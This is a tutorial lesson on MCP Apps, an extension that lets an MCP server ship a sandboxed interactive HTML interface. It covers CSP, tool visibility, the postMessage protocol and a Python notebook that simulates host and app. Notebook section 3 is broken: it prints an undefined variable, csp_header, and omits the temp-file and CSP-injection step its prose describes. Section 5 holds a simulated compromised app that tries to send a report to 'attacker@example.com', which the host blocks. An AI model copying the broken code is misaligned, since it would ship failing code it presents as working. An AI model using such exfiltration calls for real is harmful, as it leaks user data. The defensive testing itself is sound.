## Summary
Text answers only go so far. Sometimes the user needs to *interact* with data: drill into a chart, fill in a form with many options, or scrub through a video. **MCP Apps** (`io.modelcontextprotocol/ui`) lets a server ship an interactive HTML interface that the host renders inline, in a sandboxed iframe inside the conversation. The design combines two existing primitives: a **tool** whose `_meta.ui.resourceUri` points to a **`ui://` resource** served as `text/html;profile=mcp-app`. The app and host then talk through a dialect of MCP carried over `postMessage`, using `ui/initialize`, tool-result notifications and proxied `tools/call`. This lesson covers why Apps beat a separate web app, the resource and metadata formats, visibility, the CSP-based security model, and the build-and-test workflow. In the notebook you build an App with the SDK's `Apps` helper and play the host.

## Lesson
### Why not just build a web app?
You could build a standalone web app and send the user a link. The docs give four advantages that a separate page cannot match:

- **Context preservation.** The app lives inside the conversation, next to the discussion that produced it. The user doesn't switch tabs or lose track of which chat had the dashboard.
- **Bidirectional data flow.** The app can call any tool on its MCP server, and the host can push fresh results to it. A standalone app would need its own API, authentication and state management. MCP Apps get these from existing MCP patterns.
- **Integration with the host's capabilities.** The app can ask the host for an *outcome*, such as "schedule this meeting". The host routes it through capabilities the user has already connected, subject to consent, so the app doesn't need its own integrations.
- **Security guarantees.** Apps run in a host-controlled sandboxed iframe. They cannot reach the parent page, steal cookies or escape their container, so a host can render third-party apps without fully trusting the server author.

If none of these matter for your use case, a regular web app may be simpler.

### The pattern: a tool plus a `ui://` resource
Ordinary tools return text, images, resources or structured data. MCP Apps lets a tool **declare a reference to an interactive UI**, and the host renders that UI in place. When the model calls such a tool:

1. **UI preloading.** The tool's description carries `_meta.ui.resourceUri` pointing to a `ui://` resource. The host can fetch it **before the tool is even called**, which makes features like streaming tool inputs into the app possible.
2. **Resource fetch.** The host reads the resource with `resources/read`. It is an HTML page, usually bundled with its JS and CSS. External scripts and assets are allowed only from origins declared in `_meta.ui.csp`.
3. **Sandboxed rendering.** Web hosts render the HTML in a sandboxed iframe. The resource's `_meta.ui` can request `permissions` (camera, microphone, …) and declare `csp` origins.
4. **Bidirectional communication.** App and host exchange JSON-RPC over `postMessage`. Some messages are shared with core MCP (`tools/call`), some are similar (`ui/initialize`), and most are new ones with the `ui/` prefix.

Separating the **template** (the static `ui://` resource) from the **data** (the tool result) is deliberate. Hosts can review, hash and cache templates at connection time, before any tool runs.

### UI resources: format and metadata
A UI resource is a normal MCP resource with conventions on top:

- The URI **MUST** use the `ui://` scheme. The path structure is up to you, e.g. `ui://get-time/mcp-app.html`.
- `mimeType` **MUST** be `text/html;profile=mcp-app`. Other content types are reserved for future versions.
- Content is provided as `text` or as base64 `blob`, and it **MUST** be a valid HTML5 document.

The resource's `_meta.ui` object (`UIResourceMeta`) configures security and rendering:

| Field | Purpose |
| --- | --- |
| `csp.connectDomains` | Origins for fetch/XHR/WebSocket → CSP `connect-src` |
| `csp.resourceDomains` | Origins for scripts, styles, images, fonts, media → `script-src`, `style-src`, `img-src`, `font-src`, `media-src` |
| `csp.frameDomains` | Origins for nested iframes → `frame-src` (default `'none'`) |
| `csp.baseUriDomains` | Allowed base URIs → `base-uri` (default `'self'`) |
| `permissions` | `camera`, `microphone`, `geolocation`, `clipboardWrite`, each `{}`. Hosts MAY honour them, and apps should feature-detect |
| `domain` | Dedicated sandbox origin (format is host-specific), useful for OAuth callbacks or CORS allowlists |
| `prefersBorder` | `true`/`false` asks for or against a host-drawn border and background. Set it explicitly, because host defaults vary |

> **Spec rule (restrictive default).** If `ui.csp` is omitted, the host **MUST** use `default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; media-src 'self' data:; connect-src 'none';`. The host MAY restrict further but **MUST NOT** allow undeclared domains, and SHOULD log CSP configurations for audit.

That deny-by-default CSP is why the build guide bundles the UI into a **single HTML file** with `vite-plugin-singlefile`. The alternative is to declare every external origin.

### Linking tools to UIs, and visibility
A tool links to its UI with `_meta.ui` (`McpUiToolMeta`):

```json
{"name": "get_weather", "description": "Get current weather for a location",
 "inputSchema": {"type": "object", "properties": {"location": {"type": "string"}}},
 "_meta": {"ui": {"resourceUri": "ui://weather-server/dashboard-template",
                  "visibility": ["model", "app"]}}}
```

- The referenced resource **MUST** exist, and the host **MUST** fetch it with `resources/read`. The host MAY prefetch and cache it.
- Servers MAY omit UI-only resources from `resources/list`, because they are discovered through tool metadata.
- The old flat key `_meta["ui/resourceUri"]` is **deprecated** and will be removed before GA. Use `_meta.ui.resourceUri`.

`visibility` defaults to `["model", "app"]`. With `"model"` the agent can see and call the tool. With `"app"` the app can call it, from the **same server connection** only. Hosts **MUST NOT** put a tool in the agent's tool list unless its visibility includes `"model"`. A tool with `["app"]` suits UI-only actions such as "refresh dashboard". Hosts **MUST reject** `tools/call` from an app for a tool without `"app"`, and cross-server calls are always blocked for app-only tools.

### Host ↔ app communication
Conceptually, the app is an MCP client and the host acts as an MCP server that proxies to the real one. The transport is `postMessage` instead of stdio or HTTP. You can use the `App` class from `@modelcontextprotocol/ext-apps` or write the JSON-RPC by hand, since everything is standard web primitives.

| Direction | Message | Purpose |
| --- | --- | --- |
| App → Host | `ui/initialize` (request) | Handshake with `appInfo`, `appCapabilities`, `protocolVersion` (the Apps spec is versioned separately, e.g. `2026-01-26`). The result carries `hostInfo`, `hostCapabilities` and `hostContext` (theme, styles, display mode, container dimensions, locale, …) |
| App → Host | `ui/notifications/initialized` | Handshake done. The host MUST NOT message the app before this |
| Host → App | `ui/notifications/tool-input-partial` (0..n), `ui/notifications/tool-input` | Streaming or complete tool arguments |
| Host → App | `ui/notifications/tool-result` | The `CallToolResult` once the tool finishes |
| Host → App | `ui/notifications/tool-cancelled`, `ui/resource-teardown` | Cancellation, and teardown (a request the host SHOULD wait on) |
| App → Host | `tools/call`, `resources/read`, `notifications/message`, `ping` | Standard MCP, proxied or handled by the host |
| App → Host | `ui/message`, `ui/update-model-context`, `ui/open-link`, `ui/request-display-mode` | Post into the chat, update the model's context for later turns, open a URL, go `inline`/`fullscreen`/`pip` |
| Both | `ui/notifications/size-changed`, `ui/notifications/host-context-changed` | Layout and theme changes |

```text
Host                         App (iframe)                 MCP server
 |-- tools/call (model chose the tool) ------------------------>|
 |<========== render ui:// HTML in sandbox ==========>|          |
 |<-- ui/initialize ----------------------------------|          |
 |--- result {hostContext, hostCapabilities} -------->|          |
 |<-- ui/notifications/initialized -------------------|          |
 |--- ui/notifications/tool-input {arguments} ------->|          |
 |<-------------------------------------------------- CallToolResult
 |--- ui/notifications/tool-result {content, structuredContent} ->|
 |<-- tools/call (user clicked) ----------------------|          |
 |--- tools/call (proxied, visibility checked) ------------------>|
```

As a best practice for the tool result, `content` holds the text that goes to the model and to text-only hosts. `structuredContent` holds data for the UI, which is *not* added to model context. `_meta` holds metadata not meant for the model.

**Web hosts** add a layer: they **MUST** render a **sandbox proxy** iframe on a *different origin* with `allow-scripts` and `allow-same-origin`. The proxy announces `ui/notifications/sandbox-proxy-ready`, receives the HTML via `ui/notifications/sandbox-resource-ready`, loads it in an inner iframe with the computed CSP, and forwards every other message in both directions.

### Negotiation and graceful degradation
A host advertises Apps support in its client capabilities, and the settings object **requires** `mimeTypes`:

```json
"extensions": {"io.modelcontextprotocol/ui": {"mimeTypes": ["text/html;profile=mcp-app"]}}
```

Servers SHOULD check this before relying on UI. The TypeScript helper is `getUiCapability()`, and the Python SDK has `client_supports_apps(ctx)`. A server MAY register different tool variants per host. Above all, tools **MUST return a meaningful `content` array even when the UI is available**. A host that does not support Apps simply treats the tool as an ordinary tool.

### Security model
The threat model assumes a **malicious server** sending harmful HTML, a **compromised app** trying to escape the sandbox, run unauthorized tools, exfiltrate host data, or phish the user. The mitigations stack:

1. **Iframe sandboxing.** All app content **MUST** render in sandboxed iframes. The app cannot touch the parent DOM, cookies or local storage, navigate the parent, or run scripts in the parent context.
2. **Auditable communication.** Everything goes through JSON-RPC over `postMessage`. Hosts validate messages, reject malformed ones and log app-initiated calls. The host decides what an app may do, for example which tools it may call or whether `ui/open-link` is allowed. It MAY require user approval.
3. **Predeclared resource review.** Templates arrive before execution, so hosts can scan them, hash them and maintain allowlists or blocklists.
4. **CSP enforcement.** The host builds the policy only from declared domains and MUST block everything else.

The remaining risks are **social engineering** (a UI can still show misleading content, so hosts should mark the sandbox boundary clearly) and **resource exhaustion** (hosts should impose limits).

### When to use MCP Apps
The docs list five strong fits: **exploring complex data** (a clickable map instead of a list of numbers), **configuring with many options** (one form instead of twenty questions), **viewing rich media** (PDF, 3D models, images with pan and zoom), **real-time monitoring** (a live dashboard), and **multi-step workflows** (approving expenses or triaging issues one by one with persistent state).

### Building and testing an App
The build guide uses TypeScript. On the server, `registerAppTool(server, "get-time", {..., _meta: {ui: {resourceUri}}}, handler)` registers the linked tool, and `registerAppResource(server, uri, uri, {mimeType: RESOURCE_MIME_TYPE}, read)` serves the bundled HTML. The server runs over Streamable HTTP on port 3001. In the UI, `new App({name, version})`, `app.connect()` (once), `app.ontoolresult = ...` for the result the host pushes, and `app.callServerTool({name, arguments})` for user-initiated calls. Each call is a server round-trip, so design for latency. The fastest way to scaffold a project is the `create-mcp-app` **skill**, which an AI coding agent loads to generate the server, UI and config.

The **Python SDK** keeps Apps in-core: `Apps()` is an `Extension` with `@apps.tool(resource_uri=..., visibility=...)` and `apps.add_html_resource(uri, html, csp=ResourceCsp(...), permissions=..., prefers_border=...)`, and you pass it to `MCPServer(extensions=[apps])`.

For testing you have two options:

- **Claude** (web or Desktop): expose the local server with `npx cloudflared tunnel --url http://localhost:3001` and add the URL as a **custom connector** (Settings → Connectors → Add custom connector). This requires a paid plan.
- **basic-host** from the `ext-apps` repo: `SERVERS='["http://localhost:3001/mcp"]' npm start`, then open `http://localhost:8080`, call the tool and watch the sandboxed render.

Host developers can use `@mcp-ui/client` (React components) or build on the SDK's **AppBridge** module, which handles sandboxed rendering, message passing, tool-call proxying and policy enforcement. Starter templates exist for React, Vue, Svelte, Preact, Solid and vanilla JS. MCP Apps is supported by Claude, Claude Desktop, VS Code GitHub Copilot, Microsoft 365 Copilot, Goose, Postman, MCPJam, Archestra.AI, ChatGPT, Cursor and others (see the client matrix).

## Key points
- MCP Apps (`io.modelcontextprotocol/ui`) = a **tool** with `_meta.ui.resourceUri` + a **`ui://` resource** served as `text/html;profile=mcp-app`, rendered in a **sandboxed iframe**.
- Advantages over a web app are context preservation, bidirectional data flow through MCP, delegating outcomes to the host's capabilities, and sandbox security.
- Resource `_meta.ui` carries `csp` (`connectDomains`, `resourceDomains`, `frameDomains`, `baseUriDomains`), `permissions`, `domain` and `prefersBorder`. If CSP is omitted, the host uses a restrictive deny-by-default policy and MUST NOT allow undeclared domains.
- `visibility` defaults to `["model","app"]`. App-only tools are hidden from the agent, and hosts reject app calls to tools without `"app"`.
- App ↔ host speak a JSON-RPC dialect over `postMessage`: `ui/initialize` → `ui/notifications/initialized`, then `tool-input`, `tool-result`, and app-initiated `tools/call`, `ui/message`, `ui/update-model-context`, `ui/open-link`.
- The host's client capability must list `mimeTypes: ["text/html;profile=mcp-app"]`. Tools MUST still return meaningful `content` so non-Apps hosts degrade gracefully.
- `content` is for the model, `structuredContent` is for the UI (not added to model context), and `_meta` is for metadata.
- Build with `registerAppTool`/`registerAppResource` + the `App` class (TS) or `Apps` (Python). Test in Claude through a tunnel and custom connector, or locally with **basic-host**.

## Pitches
### What are MCP Apps?
MCP Apps is an official extension that lets an MCP server return an interactive interface instead of just text. A tool carries a `_meta.ui.resourceUri` pointing at a `ui://` HTML resource. The host fetches it, often ahead of time, and renders it in a sandboxed iframe right in the chat. The app and host then talk JSON-RPC over postMessage, so the app can receive the tool result, call more tools, post messages or update the model's context, all under host control.

### Why would I build an MCP App instead of a normal web app?
I'd do it when the UI belongs to the conversation. The app sits next to the discussion that produced it, so nobody loses context. It reuses MCP for data, so it doesn't need its own API, auth or state layer. It can hand outcomes like "schedule this meeting" to the host, which already has the user's connections. And the host's sandbox makes it safe to render third-party UI. If none of that matters, a plain web app is simpler.

### How is an MCP App kept secure?
There are several layers. The HTML runs in a sandboxed iframe, on a separate origin for web hosts, so it can't touch the host page, cookies or storage. Every interaction goes through auditable JSON-RPC over postMessage, and the host decides which tools the app may call. Network and asset access follow a Content Security Policy built only from domains the server declared, with a deny-by-default fallback. Templates are also predeclared, so hosts can review and hash them before anything runs.

## Interview
### How does a host know a tool has a UI, and when does it fetch it?
The tool description in `tools/list` carries `_meta.ui.resourceUri`, a `ui://` URI. The host **MUST** fetch it with `resources/read`, and it can do so **before the tool is called**, for example right after listing. That allows preloading, caching, security review, and streaming tool arguments into an already-rendered app. The resource must exist, be served as `text/html;profile=mcp-app`, and be a valid HTML5 document. Servers may leave UI-only resources out of `resources/list`, since tool metadata is how they are discovered. The legacy flat key `_meta["ui/resourceUri"]` is deprecated.

### What does `visibility` do, and give a use for `["app"]`.
`visibility` says who may call a UI-linked tool. The default is `["model","app"]`. With `"model"` the agent sees and can call it. With `"app"` the app can call it through the host, and only on the same server connection. Hosts MUST NOT show the agent tools without `"model"`, and MUST reject app calls to tools without `"app"`. A good `["app"]` example is `refresh_dashboard` or `load_page(n)`. The UI needs it for pagination or refresh, but exposing it to the model would only clutter the tool list and waste tokens.

### A UI needs data from `https://api.example.com` and a chart library from a CDN. What do you configure, and what happens if you don't?
Declare them on the resource's `_meta.ui.csp`: `connectDomains: ["https://api.example.com"]` for fetch/XHR and `resourceDomains: ["https://cdn.jsdelivr.net"]` for scripts and styles. The host builds `connect-src` and `script-src`/`style-src`/`img-src`… from those lists. Without them the host applies the restrictive default (`connect-src 'none'`, only inline or self scripts), so the fetch and the CDN script are blocked. That is the reason the build guide bundles everything into a single HTML file. The host may tighten the policy further but must never allow undeclared domains.

### How do you make an MCP App degrade gracefully?
Always return a meaningful `content` array from the tool, for example a text summary, because non-Apps hosts treat it as a normal tool and the model reads `content` in any case. Put rich, UI-oriented data in `structuredContent`. Optionally check the client's capability (`extensions["io.modelcontextprotocol/ui"].mimeTypes` must include `text/html;profile=mcp-app`) with `getUiCapability()` or `client_supports_apps(ctx)`, and adapt, for example by registering a text-only variant or adding more detail to the text when no UI will render.

### Walk through what happens between the model calling a UI tool and the user clicking a button in it.
The host sends `tools/call` to the server and, in parallel, renders the `ui://` HTML in a sandbox (through a different-origin sandbox proxy for web hosts). The app sends `ui/initialize` with `appInfo`, `appCapabilities` and `protocolVersion`. The host answers with `hostContext` (theme, display mode, dimensions) and `hostCapabilities`, and the app confirms with `ui/notifications/initialized`. The host then sends `ui/notifications/tool-input` with the arguments, and `ui/notifications/tool-result` once the server responds. When the user clicks, the app sends `tools/call` over postMessage. The host checks visibility and its own policy, forwards the call to the server, and returns the result. The app can also send `ui/update-model-context` so the model knows what the user did.

## Glossary
- MCP App | MCP 应用 | An interactive HTML interface delivered by an MCP server and rendered inline by the host in a sandboxed iframe.
- UI resource | UI 资源 | A `ui://` resource served as `text/html;profile=mcp-app` that contains the app's HTML template.
- `_meta.ui.resourceUri` | `_meta.ui.resourceUri`（UI 资源链接） | The tool metadata field that links a tool to its UI resource.
- Visibility | 可见性 | `_meta.ui.visibility`: whether a UI-linked tool is callable by the model, the app, or both.
- Sandboxed iframe | 沙箱化 iframe | A restricted iframe that isolates the app from the host page, cookies, storage and parent navigation.
- Sandbox proxy | 沙箱代理 | The different-origin intermediate iframe that web hosts use to load the app and relay messages.
- Content Security Policy (CSP) | 内容安全策略 | The browser policy the host builds from `_meta.ui.csp` to restrict which origins the app may load from or connect to.
- postMessage | postMessage（跨窗口消息） | The browser API that carries the JSON-RPC messages between app and host.
- `ui/initialize` | `ui/initialize`（应用握手） | The app's handshake request; the host replies with host info, capabilities and context.
- Host context | 宿主上下文 | Theme, styles, display mode, dimensions, locale and similar information the host gives the app.

## Notebook
### 1. An MCP App server with the SDK's `Apps` extension
`mcp.server.apps.Apps` is an `Extension`. `@apps.tool(resource_uri=...)` stamps `_meta.ui` on a tool, and `add_html_resource(...)` serves a `ui://` resource as `text/html;profile=mcp-app` with optional CSP and permissions. The HTML below is a vanilla-JS app that speaks the postMessage protocol directly, with no SDK. Note the text fallback in `content`.

```python
import json

from pydantic import BaseModel

from mcp import Client
from mcp.client.extension import advertise
from mcp.server import MCPServer
from mcp.server.apps import (APP_MIME_TYPE, EXTENSION_ID, Apps, ResourceCsp,
                             client_supports_apps)
from mcp.server.mcpserver import Context

SALES = {"Q3": {"EMEA": 120, "AMER": 200, "APAC": 90}}
DASHBOARD_URI = "ui://sales/dashboard.html"

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Sales by region</title></head>
<body>
  <h1 id="title">Loading…</h1>
  <ul id="bars"></ul>
  <button id="refresh">Refresh</button>
  <script>
    let nextId = 1; const pending = {};
    const send = (method, params) => new Promise(resolve => {
      const id = nextId++; pending[id] = resolve;
      window.parent.postMessage({jsonrpc: "2.0", id, method, params}, "*");
    });
    const notify = (method, params) => window.parent.postMessage({jsonrpc: "2.0", method, params}, "*");
    const render = (sc) => {
      document.getElementById("title").textContent = "Sales " + sc.quarter;
      document.getElementById("bars").innerHTML = Object.entries(sc.regions)
        .map(([r, v]) => `<li>${r}: ${"#".repeat(v / 10)} ${v}</li>`).join("");
    };
    window.addEventListener("message", (e) => {
      const m = e.data;
      if (m.id && pending[m.id]) { pending[m.id](m.result); delete pending[m.id]; }
      if (m.method === "ui/notifications/tool-result") render(m.params.structuredContent);
    });
    send("ui/initialize", {appInfo: {name: "sales-dashboard", version: "1.0.0"},
                           appCapabilities: {}, protocolVersion: "2026-01-26"})
      .then(() => notify("ui/notifications/initialized", {}));
    document.getElementById("refresh").onclick = async () => {
      const r = await send("tools/call", {name: "refresh_sales", arguments: {quarter: "Q3"}});
      render(r.structuredContent);
      send("ui/update-model-context", {content: [{type: "text", text: "User refreshed the Q3 dashboard."}]});
    };
  </script>
</body>
</html>"""


class RegionSales(BaseModel):
    quarter: str
    regions: dict[str, int]


apps = Apps()


@apps.tool(resource_uri=DASHBOARD_URI, description="Show sales by region for a quarter (interactive).")
def sales_by_region(quarter: str, ctx: Context) -> RegionSales:
    data = RegionSales(quarter=quarter, regions=SALES[quarter])
    return data   # the SDK puts this in structuredContent AND serializes it as text content


@apps.tool(resource_uri=DASHBOARD_URI, visibility=["app"], description="Re-fetch the dashboard data.")
def refresh_sales(quarter: str) -> RegionSales:
    return RegionSales(quarter=quarter, regions=SALES[quarter])


@apps.tool(resource_uri=DASHBOARD_URI, visibility=["model"],
           description="Email the quarter's report to someone (model only: the UI must never trigger emails).")
def email_report(quarter: str, to: str) -> str:
    return f"Sent the {quarter} report to {to}."


apps.add_html_resource(DASHBOARD_URI, DASHBOARD_HTML, name="Sales dashboard",
                       description="Bar chart of sales per region",
                       csp=ResourceCsp(connect_domains=["https://api.example.com"]),
                       prefers_border=True)

server = MCPServer("sales", extensions=[apps])   # extensions are applied here: register app tools first


@server.tool()
def export_csv(quarter: str, ctx: Context) -> str:
    """Export a quarter's sales as CSV text (model-facing, no UI)."""
    note = "" if client_supports_apps(ctx) else "  # tip: an Apps-capable host would show a dashboard"
    return "region,sales\n" + "\n".join(f"{r},{v}" for r, v in SALES[quarter].items()) + note


print("extension id:", EXTENSION_ID, "| mime type:", APP_MIME_TYPE)
```

### 2. Discovery: what an Apps-capable host sees
The host declares the extension with the **required** `mimeTypes` setting. It reads `_meta.ui` from `tools/list`, then fetches the template with `resources/read`.

```python
HOST_APPS_CAP = advertise(EXTENSION_ID, {"mimeTypes": [APP_MIME_TYPE]})

async with Client(server, extensions=[HOST_APPS_CAP]) as host:
    print("server/discover extensions:", host.server_capabilities.extensions)
    tools = (await host.list_tools()).tools
    for t in tools:
        print(f"tool {t.name:<16} _meta={json.dumps(t.meta)}")
    res = await host.read_resource(DASHBOARD_URI)
    item = res.contents[0].model_dump(by_alias=True, exclude_none=True)
    print("\nresources/read ->", json.dumps({k: v for k, v in item.items() if k != "text"}, indent=2))
    print("HTML bytes:", len(item["text"]))
```

### 3. Host-side validation: linkage, MIME type and the CSP header
A careful host checks every link before rendering anything. It confirms the `ui://` scheme, that the resource exists, the exact MIME type and the HTML5 doctype. It then builds the iframe's CSP **only** from declared domains, following the spec's construction, and writes the sandboxed document to a temp file with the policy injected as a `<meta>` tag.

```python
import tempfile
from html.parser import HTMLParser
from pathlib import Path


def build_csp(ui_meta: dict | None) -> str:
    csp = (ui_meta or {}).get("csp")
    if csp is None:   # spec's restrictive default when ui.csp is omitted
        return ("default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; "
                "img-src 'self' data:; media-src 'self' data:; connect-src 'none';")
    res = csp.get("resourceDomains", [])
    directives = [
        ["default-src", "'none'"],
        ["script-src", "'self'", "'unsafe-inline'", *res],
        ["style-src", "'self'", "'unsafe-inline'", *res],
        ["connect-src", "'self'", *csp.get("connectDomains", [])],
        ["img-src", "'self'", "data:", *res],
        ["font-src", "'self'", *res],
        ["media-src", "'self'", "data:", *res],
        ["frame-src", *(csp.get("frameDomains") or ["'none'"])],
        ["object-src", "'none'"],
        ["base-uri", *(csp.get("baseUriDomains") or ["'self'"])],
    ]
    return "; ".join(" ".join(d) for d in directives) + ";"


class ExternalRefs(HTMLParser):
    def __init__(self):
        super().__init__()
        self.refs = []

    def handle_starttag(self, tag, attrs):
        for name, value in attrs:
            if name in ("src", "href") and value and value.startswith(("http://", "https://")):
                self.refs.append((tag, value))


async def validate_ui_links(client) -> dict:
    report = {}
    for tool in (await client.list_tools()).tools:
        uri = ((tool.meta or {}).get("ui") or {}).get("resourceUri")
        if not uri:
            continue
        assert uri.startswith("ui://"), f"{tool.name}: resourceUri must use ui://"
        content = (await client.read_resource(uri)).contents[0]
        assert content.mime_type == APP_MIME_TYPE, f"{uri}: wrong mimeType {content.mime_type}"
        assert content.text.lstrip().lower().startswith("<!doctype html>"), f"{uri}: not an HTML5 document"
        parser = ExternalRefs()
        parser.feed(content.text)
        report[tool.name] = {"uri": uri, "ui_meta": (content.meta or {}).get("ui"),
                             "external_refs": parser.refs, "html": content.text}
    return report


async with Client(server, extensions=[HOST_APPS_CAP]) as host:
    report = await validate_ui_links(host)

entry = report["sales_by_region"]

print("\nCSP for the iframe:\n ", csp_header.replace("; ", ";\n  "))
```

### 4. Visibility: the model's tool list vs the app's
The host, not the server, enforces visibility. The agent sees only tools whose visibility includes `"model"`, which is the default when `visibility` is absent. The app may call only tools whose visibility includes `"app"`, also the default when absent. `email_report` is UI-linked but `["model"]`, so the model may send emails and the dashboard may not.

```python
def visibility(tool) -> list[str]:
    ui = (tool.meta or {}).get("ui") or {}
    return ui.get("visibility", ["model", "app"])   # spec default; a stricter host may refuse non-UI tools


async with Client(server, extensions=[HOST_APPS_CAP]) as host:
    all_tools = (await host.list_tools()).tools

model_tools = [t.name for t in all_tools if "model" in visibility(t)]
app_tools = [t.name for t in all_tools if "app" in visibility(t)]
print("tools the LLM is offered:   ", model_tools)
print("tools the app may call:     ", app_tools)
print("hidden from the LLM:        ", sorted(set(t.name for t in all_tools) - set(model_tools)))
```

### 5. Simulating the host ↔ app postMessage flow
Python can't run the iframe, but the protocol is plain JSON-RPC, so we play both sides. `FakeView` behaves like the HTML app above. `Host` renders it, completes the handshake, pushes tool input and result, and **proxies** the app's `tools/call` to the real MCP server after checking visibility. Every message is printed with its direction.

```python
class FakeView:
    """Stands in for the iframe: same messages the JS app sends."""
    def __init__(self):
        self.next_id, self.state = 1, None

    def request(self, method, params):
        msg = {"jsonrpc": "2.0", "id": self.next_id, "method": method, "params": params}
        self.next_id += 1
        return msg

    def on_message(self, msg):
        if msg.get("method") == "ui/notifications/tool-result":
            self.state = msg["params"]["structuredContent"]
            print(f"      [view renders] {self.state}")


class Host:
    def __init__(self, client, tools):
        self.client, self.tools = client, {t.name: t for t in tools}
        self.initialized, self.model_context = False, None

    def to_view(self, view, msg):
        assert self.initialized or msg.get("id"), "Host MUST NOT message the view before initialized"
        print("HOST -> APP ", json.dumps(msg)[:150])
        view.on_message(msg)

    async def from_view(self, view, msg):
        print("APP  -> HOST", json.dumps(msg)[:150])
        method, params = msg["method"], msg.get("params", {})
        if method == "ui/initialize":
            reply = {"protocolVersion": "2026-01-26", "hostInfo": {"name": "notebook-host", "version": "0.1"},
                     "hostCapabilities": {"serverTools": {}, "openLinks": {}},
                     "hostContext": {"theme": "dark", "displayMode": "inline",
                                     "containerDimensions": {"width": 400, "maxHeight": 600}}}
        elif method == "ui/notifications/initialized":
            self.initialized = True
            return
        elif method == "tools/call":
            tool = self.tools.get(params["name"])
            if tool is None or "app" not in visibility(tool):
                return self.to_view(view, {"jsonrpc": "2.0", "id": msg["id"],
                                           "error": {"code": -32000, "message": "Tool not callable from app"}})
            result = await self.client.call_tool(params["name"], params.get("arguments"))
            reply = result.model_dump(by_alias=True, exclude_none=True, mode="json")
        elif method == "ui/update-model-context":
            self.model_context, reply = params, {}
        else:
            reply = {}
        self.to_view(view, {"jsonrpc": "2.0", "id": msg["id"], "result": reply})


async with Client(server, extensions=[HOST_APPS_CAP]) as client:
    host, view = Host(client, (await client.list_tools()).tools), FakeView()
    args = {"quarter": "Q3"}                                   # the model decided to call sales_by_region
    await host.from_view(view, view.request("ui/initialize", {
        "appInfo": {"name": "sales-dashboard", "version": "1.0.0"},
        "appCapabilities": {}, "protocolVersion": "2026-01-26"}))
    await host.from_view(view, {"jsonrpc": "2.0", "method": "ui/notifications/initialized", "params": {}})
    host.to_view(view, {"jsonrpc": "2.0", "method": "ui/notifications/tool-input", "params": {"arguments": args}})
    result = await client.call_tool("sales_by_region", args)
    host.to_view(view, {"jsonrpc": "2.0", "method": "ui/notifications/tool-result",
                        "params": result.model_dump(by_alias=True, exclude_none=True, mode="json")})
    print("\n-- user clicks Refresh --")
    await host.from_view(view, view.request("tools/call", {"name": "refresh_sales", "arguments": args}))
    await host.from_view(view, view.request("ui/update-model-context", {
        "content": [{"type": "text", "text": "User refreshed the Q3 dashboard."}]}))
    print("\n-- a compromised app tries a model-only tool --")
    await host.from_view(view, view.request("tools/call", {"name": "email_report",
                                                               "arguments": {**args, "to": "attacker@example.com"}}))
    print("\nmodel context stored by host:", host.model_context)
```
